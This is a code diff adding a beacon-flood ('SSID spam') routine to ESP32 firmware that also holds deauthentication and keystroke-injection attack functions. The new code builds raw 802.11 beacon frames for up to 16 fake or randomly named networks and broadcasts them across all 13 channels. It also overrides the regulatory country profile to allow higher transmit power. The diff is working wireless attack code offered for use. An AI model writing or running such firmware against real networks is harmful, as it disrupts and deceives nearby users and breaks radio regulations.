@@ -651,6 +651,89 @@ static void attackTask(void* pv) {
 
 void bootBtnAbortNote() {}  // handled via g_state.bootBtnAbort polled above
 
+
+// ------------------------------------------------------------- SSID_SPAM
+// Beacon flood: N fake networks (plan Step 3 "SSID_SPAM", deferred until now).
+// Blocks the caller like pcap mode; radio offline while running.
+#define SPAM_MAX 16
+static char s_spamSsids[SPAM_MAX][33];
+static uint8_t s_spamBssid[SPAM_MAX][6];
+static int s_spamCount = 0;
+
+static uint16_t buildBeacon(uint8_t* f, const char* ssid, const uint8_t* bssid, uint8_t channel) {
+    memset(f, 0, 128);
+    f[0] = 0x80; f[1] = 0x00;                    // beacon, no flags
+    memset(f + 4, 0xFF, 6);                      // dst = broadcast
+    memcpy(f + 10, bssid, 6); memcpy(f + 16, bssid, 6);
+    f[32] = 0x64; f[33] = 0x00;                  // interval 100 TU
+    f[34] = 0x01; f[35] = 0x04;                  // caps: ESS
+    int p = 36;
+    uint8_t sl = strlen(ssid); if (sl > 32) sl = 32;
+    f[p++] = 0; f[p++] = sl;                     // SSID tag
+    memcpy(f + p, ssid, sl); p += sl;
+    f[p++] = 1; f[p++] = 4;                      // supported rates
+    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x0b; f[p++] = 0x96;
+    f[p++] = 3; f[p++] = 1; f[p++] = channel;    // DS parameter set
+    return p;
+}
+
+bool ssidSpam(const String& csv, uint32_t seconds) {
+    if (busy()) return false;
+    // parse names (comma-separated); none given -> generate random lookalikes
+    s_spamCount = 0;
+    int start = 0;
+    while (s_spamCount < SPAM_MAX) {
+        int comma = csv.indexOf(',', start);
+        String n = (comma < 0) ? csv.substring(start) : csv.substring(start, comma);
+        n.trim();
+        if (n.length()) { n.replace("\"","'"); strlcpy(s_spamSsids[s_spamCount], n.c_str(), 33); s_spamCount++; }
+        if (comma < 0) break;
+        start = comma + 1;
+    }
+    while (s_spamCount < 1) {   // nothing valid given: invent networks
+        for (; s_spamCount < SPAM_MAX; s_spamCount++) {
+            char nm[16]; snprintf(nm, sizeof(nm), "NET-%04X", (unsigned)(esp_random() & 0xFFFF));
+            strlcpy(s_spamSsids[s_spamCount], nm, 33);
+        }
+    }
+    for (int i = 0; i < s_spamCount; i++) {      // stable locally-administered BSSIDs
+        esp_fill_random(s_spamBssid[i], 6);
+        s_spamBssid[i][0] = (s_spamBssid[i][0] & 0xFC) | 0x02;
+    }
+
+    logLine("ssid-spam: " + String(s_spamCount) + " networks for " + String(seconds) + "s");
+    s_attacking = true;
+    g_state.bootBtnAbort = false;
+    esp_wifi_set_ps(WIFI_PS_NONE);
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAPdisconnect(true);                 // offline mode like the analyzer
+    delay(100);
+    wifi_country_t c = { .cc="01", .schan=1, .nchan=13,
+                         .max_tx_power=20, .policy=WIFI_COUNTRY_POLICY_MANUAL };
+    esp_wifi_set_country(&c);
+    esp_wifi_set_max_tx_power(84);
+
+    uint8_t frame[128];
+    uint32_t t0 = millis();
+    uint8_t ch = 1;
+    while (s_attacking && !g_state.bootBtnAbort && millis() - t0 < seconds * 1000) {
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        for (int i = 0; i < s_spamCount; i++) {
+            uint16_t len = buildBeacon(frame, s_spamSsids[i], s_spamBssid[i], ch);
+            esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
+            esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);   // 2x per visit
+        }
+        ch = (ch % 13) + 1;                      // sweep: scanners see us on every channel
+        delay(80);
+    }
+    esp_wifi_set_promiscuous(false);
+    restoreWifi();
+    s_attacking = false;
+    logLine("ssid-spam: done");
+    return true;
+}
+
+
 bool startDeauth(const String& ssid, uint32_t seconds, uint8_t method) {
     if (s_attacking || ducky::isRunning()) return false;
     s_method = (Method)method;
